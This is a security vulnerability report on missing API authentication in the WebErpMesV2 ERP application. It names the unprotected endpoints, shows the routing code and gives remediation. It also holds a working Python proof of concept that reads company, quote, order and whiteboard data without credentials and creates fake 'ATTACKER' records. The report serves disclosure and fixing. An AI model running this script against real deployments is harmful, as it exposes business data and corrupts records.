# Security Vulnerability Report: Unauthenticated API Access

| Field | Value |
|-------|-------|
| **Vulnerability Type** | Missing Authentication for Critical Function (CWE-306) |
| **Affected Product** | WebErpMesV2 |
| **Affected Version** | Commit 3a8ae53887e372e62948e2dbaf086fa509f6e261 / v1.18 - Melitaea aurelia |
| **Repository** | https://github.com/SMEWebify/WebErpMesv2 |


The WebErpMesV2 application exposes multiple sensitive API endpoints without authentication middleware. An unauthenticated remote attacker can read business-critical data including companies, quotes, orders, tasks, and whiteboards. Limited write access allows creation of company records and full manipulation of collaboration whiteboards.

## Technical Analysis

### Root Cause

The `api` middleware group in `app/Http/Kernel.php` does not include any authentication middleware:

```php
// app/Http/Kernel.php (lines 38-41)
'api' => [
    'throttle:api',
    \Illuminate\Routing\Middleware\SubstituteBindings::class,
],
```

All routes in `routes/api.php` are loaded with only this middleware group, meaning they only have rate limiting - **no authentication**.

### Verified Vulnerable Endpoints

Testing confirmed 19 endpoints accessible without authentication:

| Endpoint | Methods | Impact | Verified |
|----------|---------|--------|----------|
| `/api/companies` | GET, POST | Read all companies, create new records | ✓ |
| `/api/companies/{id}` | GET | Read individual company details | ✓ |
| `/api/company` | GET, POST | Duplicate endpoint, same impact | ✓ |
| `/api/quote` | GET | Read all quotes | ✓ |
| `/api/order` | GET | Read all orders | ✓ |
| `/api/tasks` | GET | Read all tasks | ✓ |
| `/api/energy-consumptions` | GET | Read energy consumption data | ✓ |
| `/api/exports/sales-orders` | GET | Export all sales orders | ✓ |
| `/api/collaboration/whiteboards` | GET, POST | Full read/create access | ✓ |
| `/api/collaboration/whiteboards/{id}` | GET, PUT | Read and modify whiteboards | ✓ |
| `/api/collaboration/whiteboards/{id}/snapshots` | GET, POST | Read/create snapshots | ✓ |
| `/api/collaboration/whiteboards/{id}/files` | GET | Read whiteboard files | ✓ |


### Proof of Concept

```python
#!/usr/bin/env python3
"""
PoC: Unauthenticated API Access in WebErpMesV2
CWE-306: Missing Authentication for Critical Function
"""

import requests
import json
import sys

def exploit(target_url):
    print(f"[*] Target: {target_url}")
    print("[*] Testing unauthenticated API access...\n")
    
    # Test READ access
    read_endpoints = [
        ("/api/companies", "List all companies"),
        ("/api/quote", "List all quotes"),
        ("/api/order", "List all orders"),
        ("/api/tasks", "List all tasks"),
        ("/api/exports/sales-orders", "Export sales orders"),
        ("/api/collaboration/whiteboards", "List whiteboards"),
    ]
    
    print("=== READ ACCESS ===")
    for endpoint, desc in read_endpoints:
        url = f"{target_url.rstrip('/')}{endpoint}"
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                print(f"[VULN] {desc}: {endpoint} - Status {resp.status_code}")
                try:
                    data = resp.json()
                    count = len(data) if isinstance(data, list) else len(data.get('data', []))
                    print(f"       Records exposed: {count}")
                except:
                    pass
        except Exception as e:
            print(f"[ERROR] {endpoint}: {e}")
    
    # Test WRITE access - Company creation
    print("\n=== WRITE ACCESS ===")
    import time
    create_url = f"{target_url.rstrip('/')}/api/companies"
    payload = {
        "code": f"ATTACKER{int(time.time())}",
        "label": "ATTACKER_COMPANY_POC"
    }
    
    try:
        resp = requests.post(create_url, json=payload, timeout=10)
        if resp.status_code in [200, 201]:
            print(f"[CRITICAL] Company created without auth!")
            print(f"           Payload: {payload}")
    except Exception as e:
        print(f"[ERROR] Company creation: {e}")
    
    # Test WRITE access - Whiteboard creation
    wb_url = f"{target_url.rstrip('/')}/api/collaboration/whiteboards"
    wb_payload = {"title": "HACKED_WHITEBOARD", "state": '{"malicious": true}'}
    
    try:
        resp = requests.post(wb_url, json=wb_payload, timeout=10)
        if resp.status_code == 200:
            print(f"[CRITICAL] Whiteboard created without auth!")
    except Exception as e:
        print(f"[ERROR] Whiteboard creation: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print(f"Example: {sys.argv[0]} http://localhost:45060")
        sys.exit(1)
    
    exploit(sys.argv[1])
```

### Code Evidence

**routes/api.php** - Routes lack authentication:
```php
Route::apiResource('companies', CompanyController::class);  // No auth
Route::apiResource('quote', QuoteController::class);        // No auth
Route::apiResource('order', OrderController::class);        // No auth
Route::apiResource('tasks', TaskController::class);         // No auth
Route::get('/exports/sales-orders', ExportSalesOrderController::class);  // No auth

// Whiteboards - full CRUD without auth
Route::prefix('collaboration/whiteboards')->group(function () {
    Route::get('/', [ApiWhiteboardController::class, 'index']);
    Route::post('/', [ApiWhiteboardController::class, 'store']);
    Route::get('/{whiteboard}', [ApiWhiteboardController::class, 'show']);
    Route::put('/{whiteboard}', [ApiWhiteboardController::class, 'update']);
    // ...
});
```

Only `/api/user` has authentication:
```php
Route::middleware('auth:api')->get('/user', function (Request $request) {
    return $request->user();
});
```

## Impact

### Confirmed Impact:
- **Confidentiality (High)**: Complete disclosure of all business data (companies, orders, quotes, tasks, whiteboards)
- **Integrity (Medium)**: Can create fake company records and manipulate whiteboards
- **Availability (Low)**: No delete operations available

### Attack Scenarios:
1. **Data Exfiltration**: Export complete customer database and sales order history
2. **Data Pollution**: Create fraudulent company records in the system
3. **Collaboration Hijacking**: Modify shared whiteboards with malicious content

### Limitations:
- DELETE operations not implemented in controllers
- UPDATE limited to whiteboards only
- Self-hosted software typically deployed on internal networks
- Rate limiting (60 req/min) provides minimal protection

## CVSS 3.1 Calculation

```
Attack Vector (AV): Network (N)
Attack Complexity (AC): Low (L)
Privileges Required (PR): None (N)
User Interaction (UI): None (N)
Scope (S): Unchanged (U)
Confidentiality (C): High (H)
Integrity (I): Low (L)
Availability (A): None (N)

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
CVSS Score: 7.5 (High)
```

## Remediation

### Option 1: Add authentication to API middleware group (Recommended)

```php
// app/Http/Kernel.php
'api' => [
    'throttle:api',
    \Illuminate\Routing\Middleware\SubstituteBindings::class,
    'auth:sanctum',  // Add Sanctum authentication
],
```

### Option 2: Wrap routes in auth middleware

```php
// routes/api.php
Route::middleware('auth:sanctum')->group(function () {
    Route::apiResource('companies', CompanyController::class);
    Route::apiResource('quote', QuoteController::class);
    Route::apiResource('order', OrderController::class);
    Route::apiResource('tasks', TaskController::class);
    Route::get('/exports/sales-orders', ExportSalesOrderController::class);
    
    Route::prefix('collaboration/whiteboards')->group(function () {
        // ... whiteboard routes
    });
});
```

### Additional Recommendations:
1. Install Laravel Sanctum for API token authentication
2. Implement role-based access control for sensitive operations
3. Add audit logging for API access
4. Consider API versioning for future security updates


## References

- CWE-306: Missing Authentication for Critical Function
- OWASP API Security Top 10 - Broken Authentication - https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/
- Laravel Sanctum Documentation: https://laravel.com/docs/sanctum
